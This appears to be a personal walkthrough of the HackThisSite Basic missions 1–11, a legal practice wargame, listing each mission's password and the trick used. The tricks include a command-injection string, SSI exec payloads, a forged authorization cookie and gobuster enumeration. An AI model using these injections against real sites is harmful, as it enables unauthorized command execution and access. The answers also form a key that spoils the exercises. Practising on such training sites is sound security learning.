# HACK THIS SITE BASIC MISSIONS

> BLUE COSM0 | 12/14/2003

## RESOURCES
- https://www.hackthissite.org/missions/basic

## BASIC 1
CTRL + U
```
password is d490abb0
```

## BASIC 2
```
no password required
```

## BASIC 3
- "password.php" WAS ATTACHED TO SUBMISSION
- OPEN TO FIND CREDENTIALS
```
137e9d2e
```

## BASIC 4
- SAMS EMAIL "sam@hackthissite.org"
- REPLACE EMAIL WITH YOUR ACCOUNT EMAIL
```
Sam,
Here is the password: 'cb221771'
```

## BASIC 5
REPLACE EMAIL WITH YOUR ACCOUNT EMAIL
```
Sam,
Here is the password: 'a233109a'
```

## BASIC 6
- ENCRPYTED PASSWORD - 0d574;h8
  - ENCRPYTED VIA UNICODE
- USE "basic6.py"
```
0c3406b1
```

## BASIC 7
ENTER: "-y && ls -a"
> OPEN k1kh31b1n55h.php
```
02bdd732
```

## BASIC 8
- SSI INJECTION:
```php
<!--#exec cmd="ls ../" -->
```
OPEN "au12ha39vc.php"
```
fd8f204d
```

## BASIC 9
- SSI INJECTION
```php
<!--#exec cmd="ls ../../9" -->
```
OPEN "p91e283zc3.php"
```
a1bce470
```

## BASIC 10
SET COOKIE WITH JS CONSOLE
```javascript
document.cookie = "level10_authorized=yes"
```
THEN ENTER ANY PASSWORD

## BASIC 11
- ALL SONGS BY ELTON JOHN

RAN: 
```bash
gobuster dir -u 'https://www.hackthissite.org/missions/basic/11' -w base11-wordlist.txt -v -o dirbuster.txt
```
OPEN "dirbuster.txt":
```bash
Found: /e (Status: 301)
Found: /index.php (Status: 200)
```

> NEW PATH: https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/

RAN: 
```bash
gobuster dir -u 'https://www.hackthissite.org/missions/basic/11/e/l/t/o/n' -w /usr/share/wordlists/dirb/common.txt -v -o dirbuster-common.txt
```
OPEN "dirbuster-common.txt":
```bash
Found: /.htaccess (Status: 200)
```

> HTACCESS FILE LED TO "DaAnswer" FILE [https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/DaAnswer]

DaAnswer:
```
The answer is **short**! Just look a little harder.
```
NAVIGATE TO: https://www.hackthissite.org/missions/basic/11/index.php
- "index.php" DISCOVERED IN "dirbuster.txt"
```
short
```
